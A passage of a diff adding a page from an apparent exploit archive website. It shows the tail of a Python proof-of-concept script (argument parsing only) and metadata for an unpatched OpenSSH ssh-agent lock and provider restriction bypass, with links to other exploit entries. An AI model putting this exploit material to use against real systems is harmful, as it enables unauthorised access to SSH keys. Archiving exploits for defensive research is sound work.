+</span></span><span class="line"><span class="cl">    <span class="n">control_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--socket&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">control_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--password&#34;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&#34;agent-lock-proof&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">control_parser</span><span class="o">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">handler</span><span class="o">=</span><span class="n">control</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">probe_parser</span> <span class="o">=</span> <span class="n">commands</span><span class="o">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s2">&#34;probe&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">probe_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--provider&#34;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">probe_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;--hold&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">float</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mf">3.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">probe_parser</span><span class="o">.</span><span class="n">set_defaults</span><span class="p">(</span><span class="n">handler</span><span class="o">=</span><span class="n">probe</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">args</span><span class="o">.</span><span class="n">handler</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+  </div>
+
+</div>
+
+
+    
+    <nav class="grid grid-cols-1 gap-3 pt-2 sm:grid-cols-2">
+      
+        <a href="/pocs/network/2026-07-11_cve-2022-26258-dlink-dir820l-command-injection/" class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand">
+          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">← previous in network</span>
+          <span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">D-Link DIR-820L `get_set.ccp` LAN Configuration OS Command Injection (CVE-2022-26258)</span>
+        </a>
+      
+      
+        <a href="/pocs/network/2026-07-15_cve-2026-15409-sonicwall-sma1000-ssrf-erlang-rce/" class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-mono-border dark:bg-mono-card dark:hover:border-brand">
+          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400 dark:text-mono-muted">next in network →</span>
+          <span class="mt-1 block truncate font-mono text-xs text-zinc-700 group-hover:text-emerald-600 dark:text-slate-300 dark:group-hover:text-brand">SonicWall SMA1000 WorkPlace SSRF → Internal Erlang RPC Remote Code Execution (CVE-2026-15409)</span>
+        </a>
+      
+    </nav>
+  </div>
+
+  
+  <aside class="hidden lg:block">
+    <div class="sticky top-20 space-y-4">
+      <nav class="rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+        <p class="mb-2 border-b border-zinc-200 pb-2 font-mono text-xs font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">On this page</p>
+        <div class="toc text-sm leading-relaxed"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#metadata">Metadata</a></li>
+    <li><a href="#affected-target">Affected Target</a></li>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#vulnerability-details">Vulnerability Details</a>
+      <ul>
+        <li><a href="#root-cause">Root Cause</a></li>
+        <li><a href="#attack-vector">Attack Vector</a></li>
+        <li><a href="#impact">Impact</a></li>
+      </ul>
+    </li>
+    <li><a href="#environment--lab-setup">Environment / Lab Setup</a>
+      <ul>
+        <li><a href="#setup-steps">Setup Steps</a></li>
+      </ul>
+    </li>
+    <li><a href="#proof-of-concept">Proof of Concept</a>
+      <ul>
+        <li><a href="#step-by-step-reproduction">Step-by-Step Reproduction</a></li>
+        <li><a href="#exploit-code">Exploit Code</a></li>
+        <li><a href="#expected-output">Expected Output</a></li>
+      </ul>
+    </li>
+    <li><a href="#detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</a></li>
+    <li><a href="#remediation">Remediation</a></li>
+    <li><a href="#references">References</a></li>
+    <li><a href="#notes">Notes</a></li>
+  </ul>
+</nav></div>
+      </nav>
+      <div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+  
+
+  <dl class="space-y-3 font-mono text-xs">
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
+      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-orange-500/40 bg-orange-500/10 text-orange-500 dark:text-orange-400">
+  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>High
+</span>
+</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
+      <dd class="mt-1">
+        <a href="/pocs/network/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">network</a>
+      </dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">OpenSSH portable — ssh, sshd, ssh-agent</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Portable tags V_9_3_P2 through V_10_4_P1 (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-07-12</dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
+      <dd class="mt-1">
+        <span class="text-red-500 dark:text-red-400" title="No vendor fix at the time of writing">Unpatched</span>
+      </dd>
+    </div>
+  </dl>
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
+    <div class="mt-2 flex flex-wrap gap-1.5">
+      
+      <a href="/tags/openssh/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#openssh</a>
+      
+      <a href="/tags/ssh-agent/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ssh-agent</a>
+      
+      <a href="/tags/agent-forwarding/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#agent-forwarding</a>
+      
+      <a href="/tags/pkcs11/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#pkcs11</a>
+      
+      <a href="/tags/race-condition/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#race-condition</a>
+      
+      <a href="/tags/state-confusion/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#state-confusion</a>
+      
+      <a href="/tags/no-cve/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#no-cve</a>
+      
+      <a href="/tags/local-provider-abuse/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#local-provider-abuse</a>
+      
+    </div>
+  </div>
+  
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
+    <ul class="mt-2 space-y-1.5">
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.4p1.tar.gz</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.openbsd.org/openssh/agent-restrict.html" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.openbsd.org/openssh/agent-restrict.html</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://man.openbsd.org/ssh-agent.1" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://man.openbsd.org/ssh-agent.1</a>
+      </li>
+      
+    </ul>
+  </div>
+  <div class="border-t border-zinc-200 pt-4 dark:border-mono-border">
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
+    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/network/2026-07-12_openssh-agent-lock-provider-bypass/" target="_blank" rel="noopener noreferrer"
+       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-mono-border dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
+      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+      intelseclab/poc-archive
+    </a>
+  </div>
+</div>
+
+
+      <div class="rounded border border-zinc-200 bg-zinc-50 p-3 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+        <span class="block font-bold text-zinc-900 dark:text-white">[!] Legal notice</span>
+        <p class="mt-1 leading-relaxed">Published for defensive and educational use only. Running this against systems you do not own or have written authorisation to test is illegal.</p>
+      </div>
+    </div>
+  </aside>
+</div>
+
+<script>
+  
+  document.querySelectorAll('.code-copy').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      var frame = btn.closest('.poc-code');
+      var code = frame && frame.querySelector('code');
+      if (!code) return;
+      navigator.clipboard.writeText(code.innerText).then(function () {
+        var prev = btn.textContent;
+        btn.textContent = 'Copied';
+        btn.classList.add('text-emerald-600', 'dark:text-brand');
+        setTimeout(function () {
+          btn.textContent = prev;
+          btn.classList.remove('text-emerald-600', 'dark:text-brand');
+        }, 1500);
+      }).catch(function () {
+        btn.textContent = 'Failed';
+        setTimeout(function () { btn.textContent = 'Copy'; }, 1500);
+      });
+    });
+  });
+</script>
+
+  </main>
+  <footer class="mt-16 border-t border-zinc-200 dark:border-mono-border">
+  <div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500">
+    <p class="font-mono">
+      PoC Archive — research artifacts for defensive and educational use only.
+    </p>
+    <p class="font-mono">
+      built with <a href="https://gohugo.io" class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages
+    </p>
+  </div>
+</footer>
+
+</body>
+</html>
